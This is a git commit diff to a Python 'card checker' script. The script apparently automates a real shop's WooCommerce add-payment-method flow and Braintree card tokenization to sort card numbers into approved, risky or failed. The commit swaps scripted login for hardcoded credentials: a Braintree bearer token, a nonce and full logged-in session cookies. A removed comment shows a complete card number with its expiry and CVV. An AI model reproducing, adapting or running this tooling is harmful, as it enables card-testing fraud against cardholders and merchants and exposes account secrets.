848e47d55cfa27dc77683512aee73b4882a1b724
yousef19077 <lyy446333@gmail.com>
2024-12-26 16:51:32 +0200

    Update chk22.py

--- chk22.py
+++ chk22.py
@@ -29,100 +29,59 @@ def chk(card):
 	
 	
 	r = requests.session()
-	acc = ['moh552vbnm1@gmail.com;','moh552vbnm2@gmail.com','moh552vbnm3@gmail.com','moh552vbnm4@gmail.com','moh552vbnm5@gmail.com']
-	email = random.choice(acc)
 
 
 
-	headers = {
-    'authority': 'identityfashion.online',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9',
-    'cache-control': 'no-cache',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-}
-
-	response = r.get('https://identityfashion.online/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
-	nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
 
 
-	headers = {
-    'authority': 'identityfashion.online',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-}
-
-	data = {
-    'username': email,
-    'password': 'jojo@ALi123',
-    'woocommerce-login-nonce': nonce,
-    '_wp_http_referer': '/my-account/add-payment-method/',
-    'login': 'Log in',
-}
-
-	response = r.post(
-    'https://identityfashion.online/my-account/add-payment-method/',
-    headers=headers,
-    data=data,
-)
-#0
 
 
-	headers = {
-    'authority': 'identityfashion.online',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9',
-    'cache-control': 'no-cache',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-}
-
-	response = r.get('https://identityfashion.online/my-account/add-payment-method/', headers=headers)
-
-	client_token_nonce = re.search(r'"client_token_nonce":"(.*?)"', response.text).group(1)
-
-	
-	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
-	
-
-#&
-	headers = {
-    'authority': 'identityfashion.online',
-    'accept': '*/*',
-    'accept-language': 'ar-EG,ar;q=0.9',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://identityfashion.online',
-    'pragma': 'no-cache',
-    'referer': 'https://identityfashion.online/my-account/add-payment-method/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    'x-requested-with': 'XMLHttpRequest',
-}
-
-	data = {
-    'action': 'wc_braintree_credit_card_get_client_token',
-    'nonce': client_token_nonce,
-}
-
-	response = r.post('https://identityfashion.online/wp-admin/admin-ajax.php', headers=headers, data=data)
 
 
-	
-	encoded_text = response.json()['data']
-	
-	decoded_text = base64.b64decode(encoded_text).decode('utf-8')
-	
-	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
 
-#4
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -131,7 +90,7 @@ def chk(card):
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'ar-EG,ar;q=0.9',
-    'authorization': f'Bearer {au}',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzUzMTAyNzYsImp0aSI6ImYxZmQxYzMyLTNiMTctNDkwZi05Y2RiLWQxNjU3YjY5ZjlhOSIsInN1YiI6InF5anJxNDR6Y2Q2czMyOWoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InF5anJxNDR6Y2Q2czMyOWoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.f6IfIsPPczN7ytFHkp9IY0DUVr2C5TxHO7ARw5EjpKC6WmOtcVEHid6Px5P1TE3HtcDZe3TCLOkvBRkjG7oG6Q',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -151,7 +110,7 @@ def chk(card):
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': 'a07755a5-f7d3-46c0-b17e-d2d530e6046b',
+        'sessionId': 'af4bd33a-f173-4206-b8ca-562f554d662f',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -171,18 +130,52 @@ def chk(card):
 }
 
 	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-
-# Note: json_data will not be serialized by requests
-# exactly as it was in the original request.
-#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"a07755a5-f7d3-46c0-b17e-d2d530e6046b"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5111972036167182","expirationMonth":"03","expirationYear":"2028","cvv":"793"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
-#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
-
 	tok = response.json()['data']['tokenizeCreditCard']['token']
-
-#5
-
+#2
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	cookies = {
+    'sbjs_migrations': '1418474375998%3D1',
+    'sbjs_current_add': 'fd%3D2024-12-26%2014%3A35%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2024-12-26%2014%3A35%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+    '_ga': 'GA1.1.1749569151.1735223716',
+    'woocommerce_items_in_cart': '1',
+    'woocommerce_cart_hash': 'fa607743e2ceb4617ba4278dc72a2064',
+    'et-editor-available-post-55-fb': 'fb',
+    'cookie_notice_accepted': 'false',
+    'wordpress_logged_in_01ab3e4e3f8942e1c1b51e73f4fe9bf4': 'bbxbcbb.hhxbfbb-8119%7C1735828654%7CyjQ8jxFjoxPcntTjmJ9PVDlvplYr1jCvPhPNVGgP2zt%7C29cc8c24e28e271fa8357340afe9c6c6c72dd0babe71f6389d0214e4a29f19a3',
+    'wp_woocommerce_session_01ab3e4e3f8942e1c1b51e73f4fe9bf4': '169%7C%7C1735396549%7C%7C1735392949%7C%7C831983ecfc579ce153abcd5c526d7e85',
+    'wfwaf-authcookie-8c84895040128b898589b5670ddc8148': '169%7Cother%7Cread%7Cdad8e0051c68967b8e3c8432dff9bb46df6aab78fbc89149dd25deaf5ad8c62e',
+    'sbjs_session': 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F',
+    '_ga_50RCK7EFBE': 'GS1.1.1735223716.1.1.1735223875.0.0.0',
+}
 
 	headers = {
     'authority': 'identityfashion.online',
@@ -190,6 +183,7 @@ def chk(card):
     'accept-language': 'ar-EG,ar;q=0.9',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded',
+    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-26%2014%3A35%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-26%2014%3A35%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _ga=GA1.1.1749569151.1735223716; woocommerce_items_in_cart=1; woocommerce_cart_hash=fa607743e2ceb4617ba4278dc72a2064; et-editor-available-post-55-fb=fb; cookie_notice_accepted=false; wordpress_logged_in_01ab3e4e3f8942e1c1b51e73f4fe9bf4=bbxbcbb.hhxbfbb-8119%7C1735828654%7CyjQ8jxFjoxPcntTjmJ9PVDlvplYr1jCvPhPNVGgP2zt%7C29cc8c24e28e271fa8357340afe9c6c6c72dd0babe71f6389d0214e4a29f19a3; wp_woocommerce_session_01ab3e4e3f8942e1c1b51e73f4fe9bf4=169%7C%7C1735396549%7C%7C1735392949%7C%7C831983ecfc579ce153abcd5c526d7e85; wfwaf-authcookie-8c84895040128b898589b5670ddc8148=169%7Cother%7Cread%7Cdad8e0051c68967b8e3c8432dff9bb46df6aab78fbc89149dd25deaf5ad8c62e; sbjs_session=pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F; _ga_50RCK7EFBE=GS1.1.1735223716.1.1.1735223875.0.0.0',
     'origin': 'https://identityfashion.online',
     'pragma': 'no-cache',
     'referer': 'https://identityfashion.online/my-account/add-payment-method/',
@@ -211,23 +205,21 @@ def chk(card):
     'wc-braintree-credit-card-3d-secure-verified': '',
     'wc-braintree-credit-card-3d-secure-order-total': '13.98',
     'wc_braintree_credit_card_payment_nonce': tok,
-    'wc_braintree_device_data': '{"correlation_id":"de63ee79235fcfe2ca364781c3913bc6"}',
+    'wc_braintree_device_data': '{"correlation_id":"c50dad9e7464329584b42de4f93b75cf"}',
     'wc-braintree-credit-card-tokenize-payment-method': 'true',
-    'woocommerce-add-payment-method-nonce': add_nonce,
+    'woocommerce-add-payment-method-nonce': 'b17bb533b6',
     '_wp_http_referer': '/my-account/add-payment-method/',
     'woocommerce_add_payment_method': '1',
 }
 
-	response = r.post(
+	response = requests.post(
     'https://identityfashion.online/my-account/add-payment-method/',
-    cookies=r.cookies,
+    cookies=cookies,
     headers=headers,
     data=data,
 )
-
 	text = response.text
 	pattern = r'Status code (.*?)\s*</li>'
-
 	
 	
 	match = re.search(pattern, text)
@@ -236,7 +228,7 @@ def chk(card):
 		if 'risk_threshold' in text:
 		    result = "RISK: Retry this BIN later."
 	else:
-		if 'Nice! New payment method added' in text or 'authenticate_rejected' in text:
+		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
 			result = "1000: Approved"
 		else:
 			result = "Error"
